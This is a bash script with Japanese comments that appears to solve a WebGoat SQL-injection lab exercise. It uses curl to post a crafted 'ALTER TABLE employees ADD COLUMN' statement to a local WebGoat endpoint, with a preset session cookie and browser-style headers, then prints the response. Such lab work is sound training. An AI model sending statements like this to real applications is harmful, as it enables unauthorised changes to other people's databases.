#!/bin/bash

# 事前に取得したJSESSIONIDを設定
JSESSIONID=MzMIPWK2mNGnFqESxZ2ZqPjrKE_McfPnp9_TOma5

# クエリをURLエンコード形式で設定
query="ALTER+TABLE+employees+ADD+COLUMN+phone+varchar(20)%3B"

# curlコマンドでリクエストを送信
response=$(curl -i -o response.txt -w "%{http_code}" \
  -X POST \
  http://localhost:8080/WebGoat/SqlInjection/attack4 \
  -H "Host: localhost:8080" \
  -H "sec-ch-ua: \"Chromium\";v=\"127\", \"Not)A;Brand\";v=\"99\"" \
  -H "Accept-Language: ja" \
  -H "sec-ch-ua-mobile: ?0" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "Accept: */*" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "sec-ch-ua-platform: \"macOS\"" \
  -H "Origin: http://localhost:8080" \
  -H "Sec-Fetch-Site: same-origin" \
  -H "Sec-Fetch-Mode: cors" \
  -H "Sec-Fetch-Dest: empty" \
  -H "Referer: http://localhost:8080/WebGoat/start.mvc?username=developer" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "Cookie: JSESSIONID=$JSESSIONID" \
  -H "Connection: keep-alive" \
  --data "query=$query")

# レスポンスコードを表示
echo "HTTP Status Code: $response"

# レスポンスボディを表示
echo "Response Body:"
cat response.txt

